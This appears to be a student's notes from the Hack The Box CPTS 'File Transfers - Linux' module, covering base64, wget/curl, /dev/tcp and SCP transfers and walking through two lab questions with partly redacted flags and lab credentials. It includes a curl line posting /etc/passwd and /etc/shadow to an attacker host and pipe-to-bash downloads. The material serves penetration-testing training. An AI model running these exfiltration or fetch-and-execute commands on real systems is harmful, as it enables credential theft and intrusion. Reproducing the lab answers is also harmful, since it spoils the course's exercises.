### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Linux File Transfer Methods



Linux gives us tons of options — most malware just uses HTTP/S anyway. Common chain seen in incident response: bash dropper → tries `curl` → fallback to `wget` → fallback to `python` → all fetch C2 stage from same URL.

Base64 encode/decode (no network) — same idea as Windows:

```diff
+ $ md5sum id_rsa
+ $ cat id_rsa | base64 -w 0; echo
```

```diff
+ $ echo -n '<b64>' | base64 -d > id_rsa
+ $ md5sum id_rsa
```

Web downloads — `wget` (`-O` uppercase) or `curl` (`-o` lowercase):

```diff
+ $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+ $ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Fileless via pipe (note: some payloads like `mkfifo` still touch disk):

```diff
+ $ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+ $ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

Bash `/dev/tcp` — no curl/wget? use the built-in TCP device file (Bash 2.04+ with `--enable-net-redirections`):

```diff
+ $ exec 3<>/dev/tcp/10.10.10.32/80
+ $ echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
+ $ cat <&3
```

How it works:

| Command | Purpose |
|---|---|
| `exec 3<>/dev/tcp/host/port` | open bidirectional FD 3 → TCP socket |
| `echo -e "GET ..." >&3` | send raw HTTP request to FD 3 |
| `cat <&3` | dump server response from FD 3 |

Caveats: plaintext only (no TLS), response includes HTTP headers — may need to strip them out.

SCP downloads — start sshd on Pwnbox, pull from target:

```diff
+ $ sudo systemctl enable ssh
+ $ sudo systemctl start ssh
+ $ netstat -lnpt
```

```diff
+ $ scp user@<pwnbox_ip>:/root/myroot.txt .
```

Web upload over HTTPS — `uploadserver` w/ self-signed cert:

```diff
+ $ sudo python3 -m pip install --user uploadserver
+ $ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+ $ mkdir https && cd https
+ $ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

POST multiple files from target with curl (`--insecure` for self-signed):

```diff
+ $ curl -X POST https://<attacker>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Quick HTTP servers — when target machine has no curl/wget but a language interpreter is around:

```diff
+ $ python3 -m http.server
+ $ python2.7 -m SimpleHTTPServer
+ $ php -S 0.0.0.0:8000
+ $ ruby -run -ehttpd . -p8000
```

SCP upload — push files from Pwnbox to target if SSH is allowed outbound:

```diff
+ $ scp /etc/passwd htb-student@<target>:/home/htb-student/
```

<br>

---

<br>

### Linux File Transfer Exercise

IP: 10.129.37.170

---

### Question 1:
Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.

#### Pull straight from target's web root:

```diff
+ $ wget http://10.129.37.170/flag.txt -O /home/htb-ac-830862/flag.txt
```

	HTTP request sent, awaiting response... 200 OK
	Length: 33 [text/plain]
	Saving to: '/home/htb-ac-830862/flag.txt'

&#x1F6A9; found **5d21cf3da--edit--ccb94f709e2559f3ea50** in the downloaded file.

---

### Question 2:
SSH to 10.129.37.170 (ACADEMY-MISC-NIX04) with user "htb-student" and password "HTB_@cademy_stdnt!" — upload upload_nix.zip, extract, run "hasher <extracted file>". Submit the hash.

#### Pull the zip from HTB Academy onto the Pwnbox:

```diff
+ $ wget -O /home/htb-ac-830862/upload_nix.zip https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
```

#### SSH into target:

```diff
+ $ ssh htb-student@10.129.37.170
```

#### Stand up a Python HTTP server on the Pwnbox in the dir holding the zip:

```diff
+ $ mkdir http && cd http
+ $ mv /home/htb-ac-830862/upload_nix.zip /home/htb-ac-830862/http/upload_nix.zip
+ $ python3 -m http.server 5555
```

#### Pull the zip on the target:

```diff
+ $ wget -O /home/htb-student/upload_nix.zip http://10.10.14.79:5555/upload_nix.zip
```

#### `unzip` not installed and no sudo — use Python's `zipfile` module instead:

```diff
+ $ python3 -m zipfile -e upload_nix.zip .
+ $ hasher upload_nix.txt
```

	159cfe5c65054bbadb2761cfa359c8b0

&#x1F6A9; found **159cfe5c65--edit--bbadb2761cfa359c8b0**.
